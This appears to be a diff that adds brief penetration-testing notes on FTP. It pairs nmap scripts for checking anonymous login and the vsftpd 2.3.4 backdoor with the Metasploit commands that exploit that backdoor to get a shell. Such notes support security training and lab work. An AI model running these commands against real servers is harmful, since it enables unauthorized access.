@@ -1,0 +1,24 @@
+#ftp-anon.nse
+
+{ OR] 
+
+msfconsole
+•	Use auxiliary/scanner/ftp/anonymous
+•	Set RHOST targetip
+•	Exploit
+
+•	Checks if anonymous login is allwd on ftp server
+
+
+
+#ftp-vsftpd-backdoor.nse
+•	Detects a backdoor in vsftpd 2.3.4
+
+               { OR } 
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOST targetip
+set RPORT 21
+run
+
+NOTE : If vulnerable it opens shell 
